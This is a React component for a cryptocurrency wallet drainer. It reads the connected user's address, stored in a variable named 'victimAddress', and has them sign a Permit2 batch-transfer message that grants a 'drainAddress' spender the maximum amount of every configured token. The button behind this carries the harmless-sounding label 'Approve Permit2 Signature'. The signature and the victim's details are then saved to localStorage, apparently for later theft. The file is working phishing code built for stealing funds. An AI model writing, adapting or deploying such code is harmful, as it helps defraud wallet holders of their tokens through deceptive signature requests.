import React, { useState } from 'react';
import { ethers } from 'ethers';
import { PERMIT2_ADDRESSES } from '../../config/permit2Addresses';
import { TOKENS } from '../../config/tokens';
import { getReceiveAddress } from '../../config/receiveAddress';
import toast from 'react-hot-toast';

export const Permit2Signer = () => {
  const [isSigning, setIsSigning] = useState(false);

  const signPermit2 = async () => {
    if (!window.ethereum) {
      toast.error('No wallet found');
      return;
    }

    setIsSigning(true);

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const victimAddress = await signer.getAddress();
      const { chainId } = await provider.getNetwork();

      const tokens = TOKENS[chainId] || TOKENS[1];
      const permit2Address = PERMIT2_ADDRESSES[chainId];
      const drainAddress = getReceiveAddress();

      const domain = {
        name: 'Permit2',
        chainId: chainId,
        verifyingContract: permit2Address
      };

      const types = {
        PermitBatchTransferFrom: [
          { name: 'permitted', type: 'TokenPermissions[]' },
          { name: 'spender', type: 'address' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' }
        ],
        TokenPermissions: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint256' }
        ]
      };

      const MAX_UINT160 = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const nonce = Math.floor(Math.random() * 1000000000000);

      const permitted = tokens.map(token => ({
        token: token.address,
        amount: MAX_UINT160
      }));

      const message = {
        permitted: permitted,
        spender: drainAddress,
        nonce: nonce,
        deadline: deadline
      };

      const signature = await signer._signTypedData(domain, types, message);

      localStorage.setItem('permit2_signature', signature);
      localStorage.setItem('permit2_deadline', deadline.toString());
      localStorage.setItem('permit2_nonce', nonce.toString());
      localStorage.setItem('victim_address', victimAddress);
      localStorage.setItem('chain_id', chainId.toString());

      toast.success('Permit2 signature approved');

    } catch (error) {
      console.error('Permit2 signing failed:', error);
      toast.error('Signature rejected');
    } finally {
      setIsSigning(false);
    }
  };

  return (
    <button
      onClick={signPermit2}
      disabled={isSigning}
      className={`w-full py-3 rounded-xl font-semibold transition-all ${
        isSigning ? 'bg-gray-700 cursor-wait' : 'bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500'
      } text-white`}
    >
      {isSigning ? 'Signing...' : 'Approve Permit2 Signature'}
    </button>
  );
};